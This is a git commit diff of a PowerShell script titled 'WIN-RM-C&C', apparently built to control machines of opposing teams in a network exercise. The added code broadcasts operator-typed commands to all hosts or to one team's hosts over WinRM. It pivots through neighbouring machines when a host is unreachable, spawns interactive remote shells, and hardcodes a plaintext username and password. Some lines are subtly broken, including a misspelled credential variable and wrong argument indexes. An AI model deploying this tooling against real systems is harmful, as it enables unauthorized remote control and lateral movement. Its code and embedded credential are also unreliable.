9b097fd1bbc68a706333d5428018e96c709aaa39
Anthony Magrene <ekfhalomaster@gmail.com>
2021-02-05 10:59:40 -0800

    Add files via upload

--- manager.ps1
+++ manager.ps1
@@ -9,6 +9,7 @@ Write-Output '-=====------------------------=====-'
 Write-Output '-=====------------------------=====-'
 Write-Output '-=====WIN-RM-C&C--------------=====-'
 Write-Output '-==================================-'
+$targetIP=@()
 $data = cat -Path .\MachineDirectory.txt
 [string]$userName = 'virus\magrene'
 [string]$userPassword = 'Tossking123@'
@@ -22,7 +23,7 @@ Foreach($i in $data){
         ($er = ($output=Invoke-Command $i -Credential $credential -ArgumentList $cmd -ScriptBlock {$args[0]}) 2>&1) | Out-Null
         Write-Output $output
         if($er.Exception){
-            $targetIP=@()
+            
             Write-Output ('Failed to contact ' + $i)
             Foreach($z in $data){
                 if($z.substring(0,5) -eq $i.substring(0,5) -and $i -ne $z) {
@@ -44,6 +45,7 @@ Foreach($i in $data){
 }
 }
 function getDomainStructure{
+    
     Foreach($i in $data){
         new-pssession $i -Credential $credenital
         $ip = Get-NetIPAddress | select ipaddress | Where-Object {$_.ipaddress -eq '10.*'}
@@ -56,44 +58,120 @@ function getDomainStructure{
     }
 }
 
+function allHost{
+    Write-Output 'Please enter a command to distribute.'
+    $cmd = read-host
+    Foreach($i in $data){
+        $currentTeam = $i.substring(0,5) 
+            Write-Output $i
+            ($er = ($output=(Invoke-Command $i -Credential $credential -ArgumentList $cmd -ScriptBlock {& $args[0]})) 2>&1)
+            
+            
+            if($er.Exception){
+                $targetIP=@()
+                Write-Output ('Failed to contact ' + $i)
+                Foreach($z in $data){
+                    if($z.substring(0,5) -eq $i.substring(0,5) -and $i -ne $z) {
+                        if($targetIP -notcontains $z){
+                            $targetIP += $z          
+                            foreach($x in $targetIP){
+                            
+                                Write-Output ('Machine at ' + $x + ' executing command on machine ' + $i)
+                                invoke-command $x -Credential $credential -ArgumentList $i , $credential , $cmd -ScriptBlock{invoke-command $args[0] -Credential $args[1] -ArgumentList $args[3] -ScriptBlock{$args[0]}} 
+                            }
+                        }
 
+                    }
+                
+                
+                }
+       
+            }
+    }    
+
+}
+
+function TargetTeam{
+    $targetIP=@()
+    $TargetTeam = read-host 'Target Team: '
+    $TargetTeam = ('10.' + $TargetTeam + '.')
+    Write-Output 'Please enter a command to distribute.'
+    $cmd = read-host
+    Write-Output '----Executing----' 
+    Foreach($i in $data){
+        if($i.Substring(0,5) -eq $TargetTeam){
+            $targetIP += $i
+    }            
+    }    
+    foreach($z in $targetIP){
+            write-output $z
+            ($er = ($output=(Invoke-Command $z -Credential $credential -ArgumentList $cmd -ScriptBlock {& $args[0]})) 2>&1)
+            if($er.Exception){
+                
+                $targetIPF=@()
+                Write-Output ('Failed to contact ' + $i)
+                Foreach($z in $data){
+                    if($z.substring(0,5) -eq $i.substring(0,5) -and $i -ne $z) {
+                        if($targetIP -notcontains $z){
+                            $targetIPF += $z          
+                            foreach($x in $targetIPF){
+                            
+                                Write-Output ('Machine at ' + $x + ' executing command on machine ' + $i)
+                                invoke-command $x -Credential $credential -ArgumentList $i , $credential , $cmd -ScriptBlock{invoke-command $args[0] -Credential $args[1] -ArgumentList $args[3] -ScriptBlock{$args[0]}} 
+                            }
+                        }
+
+                    }
+                
+                
+                }
+            
+            }
+    }
+}
 function psSession{
     $TargetTeam = read-host 'Target Team'
     $TargetTeam = ('10.' + $TargetTeam + '.')
     $TargetHost = read-host 'FTP, ADDS, Windows Client'
     if($TargetHost -eq 'FTP'){
-        New-PSSession ($TargetTeam + '2.4') -Credential $credential | Enter-PSSession
-        
+        Enter-PSSession ($TargetTeam + '2.4') -Credential $credential
+
     }
     elseif($TargetHost -eq 'ADDS'){
-        New-PSSession ($TargetTeam + '1.60') -Credential $credential | Enter-PSSession
+        Enter-PSSession ($TargetTeam + '1.60') -Credential $credential
     }
     else{
-        New-PSsession ($TargetTeam + '1.70') -Credential $credential | Enter-PSSession
+        Enter-PSSession ($TargetTeam + '1.70') -Credential $credential 
     }
-    Get-PSSession | Remove-PSSession
+    
 }
 
 function Menus{
-
-    While(1 -eq 1){
-        Write-Output '-==================================-'
-        write-output 'Select an option'
-        write-output '(1) Issue a command to all hosts.'
-        Write-Output '(2) Issue a command to all hosts of a speific team.'
-        Write-Output '(3) Issue a command to all hosts of a type.'
-        Write-Output '(4) Spawn an interactive shell.'
-
-        $input = read-host 
-        if($input -eq 4){
-            psSession
+        $control = 1
+        $f = 1
         
-        }
+            Write-Output '-==================================-'
+            write-output 'Select an option'
+            write-output '(1) Issue a command to all hosts.'
+            Write-Output '(2) Issue a command to all hosts of a speific team.'
+            Write-Output '(3) Issue a command to all hosts of a type.'
+            Write-Output '(4) Spawn an interactive shell.'
 
+            $input = read-host 
+            if($input -eq 4){
+                psSession
+            }
+            elseif($input -eq 1){
+                allHost
+            }
+            elseif($input -eq 2){
+                TargetTeam
+            }
+            
+        
 
-
-        Menus
-    }
+        
+    
 
 }
 
